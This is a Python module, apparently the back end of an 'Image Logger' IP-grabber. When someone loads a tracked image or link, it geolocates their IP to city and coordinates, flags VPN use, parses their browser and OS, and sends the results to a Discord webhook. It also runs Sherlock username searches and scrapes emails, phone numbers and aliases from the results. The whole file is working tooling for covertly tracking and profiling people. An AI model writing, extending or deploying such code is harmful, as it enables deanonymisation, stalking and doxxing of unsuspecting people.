import os
import re
import json
import requests
import subprocess
from datetime import datetime
from pathlib import Path

from user_agents import parse as ua_parse

from celery_app import celery

# Config / paths
REPO_ROOT = os.environ.get('REPO_ROOT', '/opt/app')
SHERLOCK_DIR = os.environ.get('SHERLOCK_DIR', os.path.join(REPO_ROOT, '.tools', 'sherlock'))
OUT_DIR = os.path.join(REPO_ROOT, '.pages', 'sherlock')

DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK')  # if empty, results are written to disk
IPINFO_TOKEN = os.environ.get('IPINFO_TOKEN')  # optional

os.makedirs(OUT_DIR, exist_ok=True)

# Simple regexes
RE_EMAIL = re.compile(r'[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}')
RE_PHONE = re.compile(r'(\+?\d{6,15}(?:[ \-\(\)]*\d{2,15})?)')
RE_URL = re.compile(r'https?://[^\s\'"<>]+')

# ---------------------------
# GeoIP / basic VPN heuristics
# ---------------------------
def geoip_lookup(ip):
    """
    Try ipinfo.io (if token) or fall back to ip-api.com.
    Returns a dict with available fields and a best-effort 'provider'/'asn'.
    """
    try:
        if IPINFO_TOKEN:
            r = requests.get(f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}", timeout=6)
            if r.ok:
                j = r.json()
                latlon = j.get('loc','').split(',') if j.get('loc') else [None, None]
                return {
                    "ip": j.get('ip') or ip,
                    "provider": j.get('org'),
                    "asn": j.get('org'),
                    "country": j.get('country'),
                    "region": j.get('region'),
                    "city": j.get('city'),
                    "lat": latlon[0],
                    "lon": latlon[1] if len(latlon) > 1 else None,
                    "timezone": j.get('timezone'),
                    "raw": j
                }
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,isp,as,timezone,proxy,mobile,query", timeout=6)
        if r.ok:
            j = r.json()
            if j.get('status') == 'success':
                return {
                    "ip": j.get('query'),
                    "provider": j.get('isp'),
                    "asn": j.get('as'),
                    "country": j.get('country'),
                    "region": j.get('regionName'),
                    "city": j.get('city'),
                    "lat": j.get('lat'),
                    "lon": j.get('lon'),
                    "timezone": j.get('timezone'),
                    "mobile": j.get('mobile'),
                    "proxy": j.get('proxy'),
                    "raw": j
                }
            else:
                return {"ip": ip, "error": j.get('message')}
    except Exception as e:
        return {"ip": ip, "error": str(e)}
    return {"ip": ip, "error": "lookup_failed"}

def evaluate_vpn_proxy_simple(ip, geo):
    """
    Lightweight heuristic to mark probable VPN/proxy when no paid APIs available.
    Uses 'proxy' and 'mobile' flags from geo (ip-api) and suspicious provider/asn names.
    Returns: { is_vpn, is_proxy, score(0..1), reasons:list }
    """
    score = 0.0
    reasons = []
    is_vpn = False
    is_proxy = False

    if not geo:
        return {"is_vpn": False, "is_proxy": False, "score": 0.0, "reasons": []}

    # ip-api proxy flag
    if geo.get('proxy'):
        score = max(score, 0.7)
        is_proxy = True
        reasons.append('geo.proxy')

    # mobile networks are less suspicious in general
    if geo.get('mobile'):
        score = max(score, score, 0.2)
        reasons.append('geo.mobile')

    # Heuristics on provider / ASN strings for datacenters or known VPN providers
    provider = (geo.get('provider') or '').lower() if geo.get('provider') else ''
    asn = (str(geo.get('asn') or '')).lower()
    suspicious = ['mullvad', 'nordvpn', 'expressvpn', 'surfshark', 'vpn', 'virtual', 'digitalocean', 'amazon', 'google cloud', 'hetzner', 'linode', 'ovh', 'cloudflare', 'aws']

    for s in suspicious:
        if s in provider or s in asn:
            score = max(score, 0.75)
            is_vpn = True
            is_proxy = True
            reasons.append(f'asn_provider:{s}')
            break

    # cap
    score = min(score, 1.0)
    return {"is_vpn": is_vpn, "is_proxy": is_proxy, "score": score, "reasons": reasons}

# ---------------------------
# User agent parsing
# ---------------------------
def detect_ua_info(user_agent):
    ua = ua_parse(user_agent or "")
    browser = f"{ua.browser.family} {ua.browser.version_string}".strip()
    os_str = f"{ua.os.family} {ua.os.version_string}".strip()
    return {
        "is_mobile": ua.is_mobile,
        "is_bot": ua.is_bot,
        "browser": browser,
        "os": os_str,
        "ua_string": user_agent
    }

# ---------------------------
# Discord embed / fallback write
# ---------------------------
def send_discord_embed(hit, geo, ua_info, vpninfo=None, original_url=None, thumbnail=None):
    """
    Send an embed to DISCORD_WEBHOOK if configured; otherwise write payload to disk for inspection.
    """
    title = "Image Logger — IP Captured"
    fields = []

    ip_info_value = f"**IP:** {geo.get('ip')}\n**Provider:** {geo.get('provider') or 'N/A'}\n**ASN:** {geo.get('asn') or 'N/A'}\n**Country:** {geo.get('country') or 'N/A'}\n**Region:** {geo.get('region') or 'N/A'}\n**City:** {geo.get('city') or 'N/A'}\n**Coords:** {geo.get('lat')},{geo.get('lon')}\n**Timezone:** {geo.get('timezone') or 'N/A'}"
    fields.append({"name": "IP Info", "value": ip_info_value, "inline": False})

    if vpninfo:
        vpn_val = f"Score: {vpninfo.get('score'):.2f} — VPN: {vpninfo.get('is_vpn')} — Proxy: {vpninfo.get('is_proxy')}\nReasons: {', '.join(vpninfo.get('reasons', [])) or 'none'}"
        fields.append({"name": "VPN/Proxy check", "value": vpn_val, "inline": False})

    pc_info = f"**OS:** {ua_info.get('os')}\n**Browser:** {ua_info.get('browser')}\n**Mobile:** {ua_info.get('is_mobile')}\n**Bot:** {ua_info.get('is_bot')}"
    fields.append({"name": "Client", "value": pc_info, "inline": False})

    ua_block = ua_info.get('ua_string', '')[:1500] or ''
    fields.append({"name": "User Agent", "value": f"```{ua_block}```", "inline": False})

    description = f"Endpoint: {hit.get('endpoint')} — Captured: {hit.get('received_at')}\nResource: {hit.get('resource_name') or ''}\nOriginal: {original_url or ''}"

    embed = {
        "title": title,
        "description": description,
        "color": 0x2ECC71,
        "fields": fields,
        "timestamp": datetime.utcnow().isoformat()
    }

    payload = {"embeds": [embed], "username": "Image-Logger"}

    if not DISCORD_WEBHOOK:
        # fallback: write to disk
        stamp = int(datetime.utcnow().timestamp())
        p = Path(OUT_DIR) / f"embed_{hit.get('ip','unknown')}_{stamp}.json"
        try:
            p.write_text(json.dumps({"payload": payload, "geo": geo, "vpn": vpninfo, "ua": ua_info, "hit": hit}, indent=2, ensure_ascii=False))
        except Exception:
            print("Failed writing embed fallback file")
        return

    try:
        resp = requests.post(DISCORD_WEBHOOK, json=payload, timeout=8)
        if not resp.ok:
            # store failure payload for debugging
            stamp = int(datetime.utcnow().timestamp())
            p = Path(OUT_DIR) / f"embed_fail_{hit.get('ip','unknown')}_{stamp}.json"
            p.write_text(json.dumps({"status_code": resp.status_code, "resp_text": resp.text, "payload": payload}, indent=2, ensure_ascii=False))
    except Exception as e:
        stamp = int(datetime.utcnow().timestamp())
        p = Path(OUT_DIR) / f"embed_exc_{hit.get('ip','unknown')}_{stamp}.json"
        p.write_text(json.dumps({"error": str(e), "payload": payload}, indent=2, ensure_ascii=False))

# ---------------------------
# Sherlock runner
# ---------------------------
def safe_run_sherlock(identifier, timeout=600):
    """
    Run Sherlock for an identifier. Requires Sherlock repo present in SHERLOCK_DIR.
    Writes a simple text output file and returns its contents.
    """
    if not os.path.isdir(SHERLOCK_DIR):
        raise FileNotFoundError(f"Sherlock not found in {SHERLOCK_DIR}")
    out_txt = os.path.join(OUT_DIR, f"{identifier}.txt")
    # build command: use sherlock entrypoint script
    cmd = ["python3", "sherlock", identifier, "--output", out_txt]
    try:
        subprocess.run(cmd, cwd=SHERLOCK_DIR, timeout=timeout, check=False)
    except subprocess.TimeoutExpired:
        # partial or empty result may exist
        pass
    if os.path.exists(out_txt):
        try:
            with open(out_txt, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        except Exception:
            return ""
    return ""

@celery.task(bind=True, max_retries=1, default_retry_delay=30)
def run_sherlock_task(self, identifier, metadata=None):
    """
    Celery task: run Sherlock for `identifier`, extract simple artifacts and save JSON result.
    """
    try:
        print(f"[sherlock] Starting search for: {identifier}")
        text = safe_run_sherlock(identifier)
        urls = list(dict.fromkeys(RE_URL.findall(text)))
        emails = list(dict.fromkeys(RE_EMAIL.findall(text)))
        phones = list(dict.fromkeys(RE_PHONE.findall(text)))

        # simple alias extraction heuristics
        aliases = []
        for line in text.splitlines():
            # lines that mention common site names may contain handles
            if ':' in line and any(site in line.lower() for site in ['twitter', 'instagram', 'facebook', 'tiktok', 'github', 'reddit']):
                tokens = re.findall(r'[\w\.\-_]{3,40}', line)
                for t in tokens:
                    if t.lower() not in identifier.lower() and not RE_EMAIL.match(t):
                        aliases.append(t)
        aliases = list(dict.fromkeys(aliases))

        result = {
            "identifier": identifier,
            "metadata": metadata or {},
            "fetched_at": datetime.utcnow().isoformat(),
            "urls": urls,
            "emails": emails,
            "phones": phones,
            "aliases": aliases,
        }

        out_json = os.path.join(OUT_DIR, f"{identifier}.json")
        with open(out_json, 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=2, ensure_ascii=False)

        print(f"[sherlock] Finished {identifier} -> results saved to {out_json}")
        return result
    except Exception as exc:
        try:
            raise self.retry(exc=exc)
        except Exception:
            out_err = os.path.join(OUT_DIR, f"{identifier}_error.json")
            with open(out_err, 'w', encoding='utf-8') as f:
                json.dump({"error": str(exc), "at": datetime.utcnow().isoformat(), "identifier": identifier}, f, indent=2)
            raise

# ---------------------------
# Example helper: synchronous processing of an incoming hit
# ---------------------------
def process_hit_and_notify(hit):
    """
    Given a hit dict with keys ip, user_agent, referer, received_at, endpoint, original_url, resource_name
    -> perform geoip, ua parse, simple vpn/proxy heuristic and send embed.
    This function is intended to be called synchronously from the Flask request handler (non-blocking parts).
    """
    ip = hit.get('ip')
    ua = hit.get('user_agent', '')
    geo = geoip_lookup(ip)
    ua_info = detect_ua_info(ua)
    vpninfo = evaluate_vpn_proxy_simple(ip, geo)
    send_discord_embed(hit, geo, ua_info, vpninfo, original_url=hit.get('original_url'))